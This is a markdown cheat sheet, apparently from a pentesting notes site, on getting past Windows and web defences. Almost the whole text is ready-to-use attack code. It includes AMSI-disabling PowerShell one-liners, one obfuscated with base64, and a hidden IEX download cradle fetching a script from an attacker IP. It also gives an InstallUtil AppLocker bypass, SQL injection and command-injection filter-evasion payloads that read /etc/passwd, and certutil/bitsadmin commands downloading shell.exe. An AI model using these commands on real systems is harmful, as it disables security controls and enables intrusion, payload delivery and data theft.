---
title: "Defense Evasion & Security Bypass Cheatsheet"
description: "Techniques for AMSI bypass, AV/EDR evasion, AppLocker bypass, and WAF filter circumvention."
pubDate: "2024-04-15"
category: "Cheatsheet"
tags: ["evasion", "amsi", "antivirus", "edr", "applocker", "waf", "lolbas"]
---

# Defense Evasion & Security Bypass

## 1. PowerShell AMSI Bypass Techniques

### Memory Patching AmsiScanBuffer
```powershell
# In-Memory AMSI Bypass One-Liner (AmsiScanBuffer Patch)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated AMSI Patch via Reflection
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA'))));$f=$a.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBsAGUAZAA='))),'NonPublic,Static');$f.SetValue($null,$true)
```

## 2. AppLocker & Language Mode Bypass
```powershell
# Check Current Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode

# Bypass ExecutionPolicy Restrictions
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -Command "& {IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/script.ps1')}"

# Execute C# Code via InstallUtil.exe (LOLBAS AppLocker Bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil_payload.exe
```

## 3. Web Application Firewall (WAF) Circumvention

### SQL Injection WAF Filters
```sql
-- Inline comment bypass
UNION/**/SELECT/**/1,2,3,table_name/**/FROM/**/information_schema.tables

-- Case sensitivity manipulation
UnIoN SeLeCt 1,2,3,version()

-- Unicode & URL Double Encoding
%2527%2520OR%25201=1--
```

### Command Injection Filter Bypass
```bash
# Space filter bypass:
cat$IFS/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# Slash and character bypass:
$(echo -n "L2Jpbi9iYXNo" | base64 -d)
```

## 4. Living off the Land Binaries (LOLBAS)

### File Download via Certutil & Bitsadmin
```cmd
# Certutil Download
certutil.exe -urlcache -split -f "http://10.10.14.X/shell.exe" "C:\Windows\Temp\shell.exe"

# Bitsadmin Download
bitsadmin /transfer job /download /priority normal http://10.10.14.X/shell.exe C:\Windows\Temp\shell.exe
```
